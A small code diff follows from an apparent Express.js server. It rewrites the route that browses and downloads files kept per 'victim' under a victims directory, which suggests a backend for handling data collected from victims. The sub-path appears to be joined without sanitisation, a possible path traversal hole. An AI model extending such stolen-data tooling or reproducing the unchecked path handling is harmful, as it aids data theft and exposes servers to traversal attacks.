@@ -92,9 +92,9 @@ app.get("/victim/:id", async (req, res) => {
 });
 
 // --- Browse victim files / Download (handles both folders and files) ---
-app.get("/victim/:id/:splat*", async (req, res) => {
+app.get("/victim/:id/:path(.*)", async (req, res) => {
   const safeId = path.basename(req.params.id);
-  const subPath = req.params.splat ? req.params.splat.join("/") : "";
+  const subPath = req.params.path || "";
   const victimDir = path.join(VICTIMS_DIR, safeId);
   const fullPath = path.join(victimDir, subPath);
 
